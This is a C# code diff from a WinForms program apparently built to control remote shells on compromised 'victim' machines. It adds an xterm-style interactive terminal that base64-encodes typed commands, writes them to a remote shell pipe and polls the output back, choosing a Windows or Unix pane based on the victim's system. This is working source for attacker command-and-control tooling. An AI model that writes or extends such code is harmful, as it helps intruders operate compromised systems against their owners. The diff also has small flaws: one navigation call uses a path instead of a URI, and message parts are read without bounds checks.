@@ -10,10 +10,13 @@ using System.Drawing;
 using System.Linq;
 using System.Runtime.InteropServices.JavaScript;
 using System.Text;
+using System.Text.Json.Serialization;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
 using System.Xml.Linq;
+using Newtonsoft.Json;
+using System.Web;
 
 namespace Alien
 {
@@ -1103,8 +1106,77 @@ namespace Alien
             treeView3.SelectedNode = cdNode;
 
             //Shell
+
             m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
             fnShellInit();
+
+            tabControl8.Appearance = TabAppearance.FlatButtons;
+            tabControl8.ItemSize = new Size(0, 1);
+            tabControl8.SizeMode = TabSizeMode.Fixed;
+
+            string szBaseDir = AppDomain.CurrentDomain.BaseDirectory;
+            string szRelativePath = Path.Combine("Tools", "xterm", "terminal.html");
+            string szAbsolutePath = Path.Combine(szBaseDir, szRelativePath);
+
+            await webViewShell.EnsureCoreWebView2Async(null);
+            webViewShell.CoreWebView2.Navigate(new Uri(szAbsolutePath).AbsoluteUri);
+            webViewShell.CoreWebView2.WebMessageReceived += async (s, e) =>
+            {
+                string rawMsg = e.TryGetWebMessageAsString();
+
+                var parts = rawMsg.Split('|');
+                if (parts.Length < 2 || parts[0] != "xterm")
+                    return;
+
+                string action = parts[1];
+
+                if (action == "input")
+                {
+                    string b64Data = parts[2];
+                    await m_rShell.fnPipeWrite(b64Data);
+                }
+                else if (action == "resize")
+                {
+                    string cols = parts[2];
+                    string rows = parts[3];
+                    await m_rShell.fnPipeResize(cols, rows);
+                }
+            };
+            webViewShell.SizeChanged += async (s, e) =>
+            {
+                await webViewShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
+            };
+
+            await webViewLinuxShell.EnsureCoreWebView2Async(null);
+            webViewLinuxShell.CoreWebView2.Navigate(new Uri(szAbsolutePath).AbsolutePath);
+            webViewLinuxShell.CoreWebView2.WebMessageReceived += async (s, e) =>
+            {
+                string rawMsg = e.TryGetWebMessageAsString();
+
+                var parts = rawMsg.Split('|');
+                if (parts.Length < 2 || parts[0] != "xterm")
+                    return;
+
+                string action = parts[1];
+
+                if (action == "input")
+                {
+                    string b64Data = parts[2];
+                    await m_rShell.fnPipeWrite(b64Data);
+                }
+                else if (action == "resize")
+                {
+                    string cols = parts[2];
+                    string rows = parts[3];
+                    await m_rShell.fnPipeResize(cols, rows);
+                }
+            };
+            webViewLinuxShell.SizeChanged += async (s, e) =>
+            {
+                await webViewLinuxShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
+            };
+
+            tabControl8.SelectedIndex = m_victim.m_bUnixLike ? 1 : 0;
 
             //Database
             fnDbInit();
@@ -1625,7 +1697,7 @@ namespace Alien
                 return;
 
             var config = (clsfnDb.stDbConfig)node.Tag;
-            
+
             if (!m_dbMgr.fnbDbDelete(config))
             {
                 MessageBox.Show("Cannot remote database: " + node.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -1644,7 +1716,7 @@ namespace Alien
                 return;
 
             clsDbTablePageControls ctrls = (clsDbTablePageControls)page.Tag;
-            
+
             if (ctrls.listView.Items.Count == 0)
                 return;
 
@@ -1678,6 +1750,61 @@ namespace Alien
         private void toolStripMenuItem27_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            await m_rShell.fnPipeCreate(textBox4.Text);
+
+            timerShell.Interval = 300;
+            timerShell.Start();
+        }
+
+        private async void timerShell_Tick(object sender, EventArgs e)
+        {
+            string szResp = await m_rShell.fnPipeRead();
+            if (string.IsNullOrEmpty(szResp))
+                return;
+
+            var objJson = JsonConvert.DeserializeObject<dynamic>(szResp);
+            if (objJson == null)
+                return;
+
+            string status = objJson.status;
+            if (status != "success")
+                return;
+
+            string szb64Msg = objJson.msg;
+            if (string.IsNullOrEmpty(szb64Msg))
+                return;
+
+            if (m_victim.m_bUnixLike)
+                webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+            else
+                webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+        }
+
+        private async void textBox5_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                string szCmd = textBox5.Text.Trim() + "\r\n";
+
+                byte[] payloadBytes = Encoding.UTF8.GetBytes(szCmd);
+                string b64Payload = Convert.ToBase64String(payloadBytes);
+
+                await m_rShell.fnPipeWrite(b64Payload);
+
+                textBox5.Text = string.Empty;
+            }
+        }
+
+        private async void button2_Click(object sender, EventArgs e)
+        {
+            await m_rShell.fnPipeCreate(textBox5.Text);
+
+            timerShell.Interval = 300;
+            timerShell.Start();
         }
     }
 }
